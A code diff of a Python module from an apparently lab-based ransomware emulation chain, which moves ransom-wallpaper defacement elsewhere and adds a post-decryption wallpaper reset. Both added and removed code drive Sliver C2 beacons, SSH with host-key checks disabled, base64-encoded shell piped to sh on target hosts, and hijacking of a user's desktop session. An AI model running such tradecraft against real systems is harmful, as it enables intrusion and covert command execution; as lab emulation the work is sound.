@@ -1,20 +1,17 @@
-"""advanced_restoration.py — Phase 9: Ransomware visual impact + interactive decryption.
+"""advanced_restoration.py — Phase 9: Interactive decryption + lab reset.
 
 MITRE ATT&CK:
-  T1491.001 — Defacement: Internal Defacement (ransom wallpaper on ubuntu_workstation VNC)
-  T1490     — Inhibit System Recovery (reversed — decrypts in-place-encrypted files so
-              the lab environment can be reset for repeat demo runs)
+  T1490 — Inhibit System Recovery (reversed — decrypts in-place-encrypted files so
+           the lab environment can be reset for repeat demo runs)
 -----------------------------------------------------------------------------
 Runs as the final optional step of the advanced chain, after advanced_cleanup_backdoor.
-
-Phase 0 — Upload ran_wall.jpg from kali (Attack-chain/payloads/) → vinzenz_ws via
-          sliver upload, SCP vinzenz_ws → john_ws (ubuntu_workstation), set XFCE
-          wallpaper as john.stravidis on DISPLAY=:1 via xfconf-query + xfdesktop
-          reload. VNC on localhost:5901 will show the ransom note.
+The ransom wallpaper is set by advanced_cleanup_backdoor (T1491.001); this step
+resets it after successful decryption.
 
 Phase 1 — Prompt: "Pay the ransom and decrypt files? (Y/N)"
 
 Phase 2a (Y) — Rich progress animation while decryption runs in a background thread.
+               On success: reset XFCE wallpaper to default on ubuntu_workstation.
                Completion panel when done.
 
 Phase 2b (N) — Environment stays encrypted + wallpaper stays. Exit cleanly.
@@ -26,8 +23,9 @@ import re
 import threading
 import time
 
+
 from chainlog import log
-from advanced_initial_access import sliver_exec, sliver_upload
+from advanced_initial_access import sliver_exec
 
 from rich.console import Console
 from rich.panel import Panel
@@ -40,10 +38,9 @@ _console = Console()
 # Constants
 # ---------------------------------------------------------------------------
 
-PGPASS_PATH   = "/home/vinzenz.fedora/.pgpass"
-DB_HOST       = "10.30.0.6"
-WALLPAPER_SRC = "/Attack-chain/payloads/ran_wall.jpg"  # kali-side path (bind-mounted)
-WALLPAPER_DST = "/tmp/ran_wall.jpg"                    # path on target hosts
+PGPASS_PATH      = "/home/vinzenz.fedora/.pgpass"
+DB_HOST          = "10.30.0.6"
+WALLPAPER_REMOTE = "/tmp/ran_wall.jpg"   # set by cleanup_backdoor; reset here after decrypt
 
 # ---------------------------------------------------------------------------
 # Helpers — beacon task polling
@@ -76,66 +73,41 @@ def _beacon_exec_wait(beacon_id: str, command: str, *,
 
 
 # ---------------------------------------------------------------------------
-# Phase 0 — Ransom wallpaper (T1491.001)
+# Wallpaper reset — run after successful decryption
 # ---------------------------------------------------------------------------
 
-def _set_ransom_wallpaper(vinzenz_beacon: str) -> None:
-    """Upload ran_wall.jpg kali → vinzenz_ws → john_ws, set XFCE wallpaper."""
-    log("\n[*] ── Phase 0: setting ransom wallpaper on ubuntu_workstation ──")
-
-    if not os.path.exists(WALLPAPER_SRC):
-        log(f"[-] {WALLPAPER_SRC} not found on kali — skipping wallpaper")
-        return
-
-    # 1. Upload from kali to vinzenz_ws via sliver
-    try:
-        sliver_upload(vinzenz_beacon, WALLPAPER_SRC, WALLPAPER_DST)
-        log(f"[+] Uploaded {WALLPAPER_SRC} → vinzenz_ws:{WALLPAPER_DST}")
-    except Exception as exc:
-        log(f"[-] sliver_upload failed: {exc} — skipping wallpaper")
-        return
-
-    # 2. SCP from vinzenz_ws → john_ws (ubuntu_workstation)
-    scp_cmd = (
-        f"execute -o -- scp -o StrictHostKeyChecking=no "
-        f"-o UserKnownHostsFile=/dev/null "
-        f"{WALLPAPER_DST} john:{WALLPAPER_DST}"
-    )
-    sliver_exec(vinzenz_beacon, scp_cmd, timeout=20)
-    log(f"[+] SCP'd wallpaper to john_ws:{WALLPAPER_DST}")
-
-    # 3. Set XFCE wallpaper as john.stravidis (DISPLAY=:1).
-    # Read DBUS_SESSION_BUS_ADDRESS from the running xfce4-session process
-    # environment; fall back to the standard XDG socket path.
-    wallpaper_script = (
+def _reset_wallpaper(vinzenz_beacon: str) -> None:
+    """Reset XFCE wallpaper to default on ubuntu_workstation (removes ransom note)."""
+    reset_script = (
         "JOHN_UID=$(id -u john.stravidis); "
         "DBUS_ADDR=$(cat /proc/$(pgrep -u john.stravidis -x xfce4-session 2>/dev/null"
         " | head -1)/environ 2>/dev/null | tr '\\0' '\\n'"
         " | grep ^DBUS_SESSION_BUS_ADDRESS= | cut -d= -f2-); "
         '[ -z "$DBUS_ADDR" ] && DBUS_ADDR="unix:path=/run/user/${JOHN_UID}/bus"; '
-        f"runuser -u john.stravidis -- env DISPLAY=:1 "
-        f'DBUS_SESSION_BUS_ADDRESS="$DBUS_ADDR" '
-        f"xfconf-query -c xfce4-desktop "
-        f"-p /backdrop/screen0/monitor0/workspace0/last-image "
-        f"-s {WALLPAPER_DST} 2>/dev/null || true; "
+        "runuser -u john.stravidis -- env DISPLAY=:1 "
+        'DBUS_SESSION_BUS_ADDRESS="$DBUS_ADDR" '
+        "xfconf-query -c xfce4-desktop "
+        "-p /backdrop/screen0/monitor0/workspace0/last-image "
+        "-r 2>/dev/null || true; "
+        f"rm -f {WALLPAPER_REMOTE} 2>/dev/null || true; "
         "pkill -USR1 -u john.stravidis xfdesktop 2>/dev/null || true; "
-        "echo WALLPAPER_OK"
+        "echo WALLPAPER_RESET"
     )
-    b64_wp = base64.b64encode(wallpaper_script.encode()).decode()
+    b64 = base64.b64encode(reset_script.encode()).decode()
     ssh_cmd = (
         f"execute -o -- sh -c "
         f"'ssh -n -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null john "
-        f"\"echo {b64_wp} | base64 -d | sh\" 2>/dev/null || true'"
+        f"\"echo {b64} | base64 -d | sh\" 2>/dev/null || true'"
     )
     out = sliver_exec(vinzenz_beacon, ssh_cmd, timeout=25)
-    if out and "WALLPAPER_OK" in out:
-        log("[+] Ransom wallpaper set on ubuntu_workstation (VNC :5901) ✓")
+    if out and "WALLPAPER_RESET" in out:
+        log("[+] Ransom wallpaper removed — VNC desktop restored to default ✓")
     else:
-        log("[-] Wallpaper command did not confirm — may not have applied")
+        log("[-] Wallpaper reset did not confirm (non-fatal)")
 
 
 # ---------------------------------------------------------------------------
-# Phase 2 — Network-wide file decryption
+# Network-wide file decryption
 # ---------------------------------------------------------------------------
 
 def _discover_db_creds(vinzenz_beacon: str) -> dict | None:
@@ -405,18 +377,12 @@ def _animate_and_restore(vinzenz_beacon: str, creds: dict) -> bool:
 # ---------------------------------------------------------------------------
 
 def run(root_sliver_session: str, vinzenz_beacon: str, results_dir: str) -> dict:
-    """Phase 9 — ransom wallpaper + interactive decryption prompt + animation."""
-    log("\n[*] Starting Phase 9: Ransomware Impact + Recovery …")
+    """Phase 9 — interactive decryption prompt + animation + wallpaper reset."""
+    log("\n[*] Starting Phase 9: Ransomware Recovery …")
 
     if not vinzenz_beacon:
         log("[-] No active vinzenz beacon — cannot proceed.")
         return {"restore_success": False}
-
-    # Phase 0: set ransom wallpaper on ubuntu_workstation (best-effort)
-    try:
-        _set_ransom_wallpaper(vinzenz_beacon)
-    except Exception as exc:
-        log(f"[-] Wallpaper phase failed (non-fatal): {exc}")
 
     # Phase 1: show impact context + prompt
     _console.print()
@@ -457,6 +423,10 @@ def run(root_sliver_session: str, vinzenz_beacon: str, results_dir: str) -> dict
 
     if restore_ok:
         log("[+] Phase 9: Restoration completed successfully.")
+        try:
+            _reset_wallpaper(vinzenz_beacon)
+        except Exception as exc:
+            log(f"[-] Wallpaper reset failed (non-fatal): {exc}")
     else:
         log("[-] Phase 9: Restoration completed with errors — check chainlog.")
 
